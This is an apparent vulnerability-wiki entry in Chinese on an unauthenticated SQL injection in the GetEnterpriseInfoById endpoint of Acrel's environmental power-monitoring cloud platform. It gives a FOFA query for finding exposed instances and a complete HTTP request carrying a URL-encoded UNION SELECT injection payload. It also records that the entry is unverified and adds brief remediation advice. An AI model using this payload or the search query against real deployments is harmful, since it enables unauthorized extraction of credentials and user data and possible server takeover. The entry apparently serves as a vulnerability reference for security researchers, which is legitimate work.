---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "安科瑞环保用电监管云平台 GetEnterpriseInfoById SQL 注入"
product: "安科瑞环保用电监管云平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "声称未认证"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%AE%89%E7%A7%91%E7%91%9E/%E5%AE%89%E7%A7%91%E7%91%9E%E7%8E%AF%E4%BF%9D%E7%94%A8%E7%94%B5%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0%20GetEnterpriseInfoById%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"myCss/phone.css\""
fofa_unverified: "body="
id: "vw-f53712b218e5c9f94a595ee4"
entity_id: "ve-f53712b218e5c9f94a595ee4"
schema_version: "1"
---

# 安科瑞环保用电监管云平台 GetEnterpriseInfoById SQL 注入

## 条目说明

- 对象与具体问题：安科瑞环保用电监管云平台；GetEnterpriseInfoById SQLi
- 版本、配置及部署条件：无版本
- 认证与权限前提：声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA残缺；完整UNION常量应补解码及响应对照
- 在野/广影响/RCE能力无引证，HTTP无围栏及修复build缺失

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

安科瑞环保用电监管云平台 GetEnterpriseInfoById 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

安科瑞环保用电监管云平台

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="myCss/phone.css"

POC/EXP：

```http
GET /MainMonitor/GetEnterpriseInfoById?EnterpriseId=%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x716a627871%2C0x647a457071654e45644d4c627a716c4d7948505a4d67756a786c70576a5a4f7749627a5449486562%2C0x7178767171%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


![image-20241126171802207](./.resource/安科瑞环保用电监管云平台GetEnterpriseInfoByIdSQL注入漏洞/media/image-20241126171802207.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
